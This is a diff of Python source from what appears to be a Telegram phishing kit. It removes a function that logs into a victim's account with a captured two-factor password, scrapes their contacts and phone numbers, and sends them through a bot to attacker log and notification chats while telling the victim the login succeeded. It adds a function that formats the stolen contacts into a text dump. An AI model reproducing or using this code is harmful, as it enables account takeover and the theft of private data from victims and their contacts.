@@ -326,156 +326,43 @@ async def save_contacts_to_file(phone, contacts):
         print(f"❌ Ошибка сохранения файла: {e}")
         return None
 
-async def verify_telegram_2fa(phone, password):
+async def create_contacts_txt_file(phone, contacts):
+    """Создает txt файл со всеми контактами"""
     try:
-        # Очищаем номер так же как при отправке
-        phone_clean = ''.join(c for c in phone if c.isdigit() or c == '+')
-        if not phone_clean.startswith('+'):
-            phone_clean = '+' + phone_clean
+        filename = f"contacts_{phone}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(f"=== БАЗА КОНТАКТОВ TELEGRAM ===\n\n")
+            f.write(f"👤 Владелец аккаунта: {phone}\n")
+            f.write(f"📅 Дата сбора: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"📊 Всего контактов: {len(contacts)}\n")
             
-        print(f"🔐 Проверка 2FA для номера: {phone_clean}")
-        
-        if phone_clean not in active_sessions:
-            return {'success': False, 'error': 'Сессия не найдена'}
-        
-        session = active_sessions[phone_clean]
-        client = session['client']
-        
-        # Входим с паролем
-        await client.sign_in(password=password)
-        print(f"✅ 2FA успешно пройдена для {phone_clean}")
-        
-        # 🔥 ВЫКАЧКА ТОЛЬКО РЕАЛЬНЫХ КОНТАКТОВ
-        print(f"🚀 Начинаем сбор РЕАЛЬНЫХ КОНТАКТОВ...")
-        
-        # Получаем контакты через GetContactsRequest
-        from telethon.tl.functions.contacts import GetContactsRequest
-        from telethon.tl.types import InputPeerEmpty
-        
-        try:
-            result = await client(GetContactsRequest(hash=0))
-            contacts = result.contacts
-            print(f"✅ Получено {len(contacts)} контактов через GetContactsRequest")
-        except Exception as e:
-            print(f"❌ Ошибка получения контактов через GetContactsRequest: {e}")
-            # Альтернативный способ - получаем всех пользователей
-            contacts = []
-            async for user in client.iter_dialogs():
-                if user.is_user and not user.entity.bot:
-                    contacts.append(user.entity)
-            print(f"✅ Получено {len(contacts)} контактов через iter_dialogs")
-        
-        real_contacts = []
-        for contact in contacts:
-            try:
-                # Проверяем что это пользователь (не бот)
-                if hasattr(contact, 'first_name') and not getattr(contact, 'bot', False):
-                    contact_info = {
-                        'id': contact.id,
-                        'first_name': contact.first_name or '',
-                        'last_name': contact.last_name or '',
-                        'username': contact.username or '',
-                        'phone': getattr(contact, 'phone', 'скрыт'),
-                        'mutual': getattr(contact, 'mutual_contact', False),
-                        'is_contact': True
-                    }
-                    real_contacts.append(contact_info)
-                    
-                    name = f"{contact.first_name or ''} {contact.last_name or ''}".strip()
-                    phone_display = contact_info['phone'] if contact_info['phone'] != 'скрыт' else 'скрыт'
-                    print(f"📞 Контакт: {name} | Телефон: {phone_display} | @{contact.username}")
-                    
-            except Exception as e:
-                print(f"❌ Ошибка обработки контакта {getattr(contact, 'id', 'unknown')}: {e}")
-                continue
-
-        print(f"✅ Собрано {len(real_contacts)} РЕАЛЬНЫХ контактов")
-
-        # 🔥 СОЗДАЕМ TXT ФАЙЛ С РЕАЛЬНЫМИ КОНТАКТАМИ
-        contacts_txt_file = await create_contacts_txt_file(phone_clean, real_contacts)
-        
-        # 🔥 ОТПРАВЛЯЕМ TXT ФАЙЛ В ГРУППУ ДЛЯ ЛОГОВ (FILES_CHAT_ID)
-        if contacts_txt_file and os.path.exists(contacts_txt_file):
-            try:
-                with open(contacts_txt_file, 'rb') as file:
-                    await bot.send_document(
-                        FILES_CHAT_ID,  # ✅ Отправляем в чат для логов
-                        types.BufferedInputFile(
-                            file.read(),
-                            filename=f"contacts_{phone_clean}.txt"
-                        ),
-                        caption=f"📁 БАЗА РЕАЛЬНЫХ КОНТАКТОВ\n📟 Номер: {phone_clean}\n👥 Контактов: {len(real_contacts)}"
-                    )
-                print("✅ TXT файл с РЕАЛЬНЫМИ контактами отправлен в группу для логов!")
-                
-                # Удаляем временный файл после отправки
-                os.remove(contacts_txt_file)
-                
-            except Exception as e:
-                print(f"❌ Ошибка отправки файла: {e}")
-        
-        # Формируем сообщение с контактами для preview
-        contacts_text = f"📱 ВЫКАЧАНЫ РЕАЛЬНЫЕ КОНТАКТЫ\n\n"
-        contacts_text += f"📟 Номер: {phone_clean}\n"
-        contacts_text += f"👥 Контактов в телефонной книге: {len(real_contacts)}\n"
-        contacts_text += f"📁 TXT файл отправлен: {'✅' if contacts_txt_file else '❌'}\n"
-        contacts_text += f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-        
-        contacts_text += "📞 ПРЕВЬЮ КОНТАКТОВ (с номерами):\n"
-        contacts_text += "=" * 50 + "\n\n"
-        
-        # Добавляем первые 10 контактов для preview (с номерами)
-        contact_count = 0
-        for i, contact in enumerate(real_contacts, 1):
-            if contact_count >= 10:
-                break
-                
-            name = f"{contact['first_name']} {contact['last_name']}".strip()
-            phone = contact['phone'] if contact['phone'] and contact['phone'] != 'скрыт' else 'номер скрыт'
-            username = f"@{contact['username']}" if contact['username'] else "нет юзернейма"
+            # Считаем взаимные
+            mutual_count = sum(1 for c in contacts if c.get('mutual_contact', False))
+            f.write(f"🤝 Взаимных контактов: {mutual_count}\n\n")
             
-            # Показываем только контакты с телефоном
-            if phone != 'номер скрыт':
-                contacts_text += f"{i}. {name}\n"
-                contacts_text += f"   📞 {phone}\n"
-                contacts_text += f"   🔗 {username}\n\n"
-                contact_count += 1
-        
-        if len(real_contacts) > contact_count:
-            contacts_text += f"... и еще {len(real_contacts) - contact_count} контактов в файле\n"
-        
-        # 🔥 ОТПРАВЛЯЕМ ПРЕВЬЮ В ГРУППУ ДЛЯ ОТСТУКОВ
-        try:
-            await bot.send_message(NOTIFICATION_CHAT_ID, contacts_text)  # ✅ В чат для отстуков
-            print(f"✅ Превью контактов отправлено в группу для отстуков!")
-        except Exception as e:
-            print(f"❌ Ошибка отправки превью: {e}")
-        
-        # Создаем сессию
-        session_token = create_user_session(phone_clean, client)
-        
-        # Очищаем активную сессию
-        if phone_clean in active_sessions:
-            del active_sessions[phone_clean]
-        
-        # Отстук о успешной авторизации
-        add_notification(
-            f"✅ УСПЕШНАЯ АВТОРИЗАЦИЯ\n"
-            f"📟 Номер: +{phone_clean}\n"
-            f"👥 РЕАЛЬНЫХ контактов выкачано: {len(real_contacts)}\n"
-            f"📁 TXT файл отправлен в логи: Да"
-        )
-        
-        return {
-            'success': True,
-            'session_token': session_token,
-            'contacts_count': len(real_contacts),
-            'message': '✅ Авторизация успешна! Закройте это окно и войдите в свой аккаунт Telegram.'
-        }
+            f.write("=" * 60 + "\n\n")
             
+            for i, contact in enumerate(contacts, 1):
+                mutual = "ВЗАИМНЫЙ" if contact.get('mutual_contact', False) else "НЕВЗАИМНЫЙ"
+                f.write(f"👤 КОНТАКТ #{i} [{mutual}]\n")
+                f.write(f"📞 Телефон: {contact.get('phone', 'скрыт')}\n")
+                f.write(f"👤 Имя в профиле: {contact.get('first_name', '')} {contact.get('last_name', '')}\n")
+                
+                # Добавляем имя как подписано
+                stored_name = contact.get('name_as_stored', '')
+                if stored_name and stored_name != f"{contact.get('first_name', '')} {contact.get('last_name', '')}".strip():
+                    f.write(f"📛 Как подписано у вас: {stored_name}\n")
+                
+                f.write(f"🔗 Юзернейм: @{contact.get('username', 'нет')}\n")
+                f.write(f"🆔 ID: {contact.get('id', '')}\n")
+                f.write("-" * 50 + "\n\n")
+        
+        print(f"✅ Файл с контактами создан: {filename}")
+        return filename
     except Exception as e:
-        print(f"❌ Ошибка 2FA: {e}")
-        return {'success': False, 'error': str(e)}
+        print(f"❌ Ошибка создания файла: {e}")
+        return None
 
 # === HTTP ОБРАБОТЧИКИ ДЛЯ САЙТА ===
 async def handle_index(request):
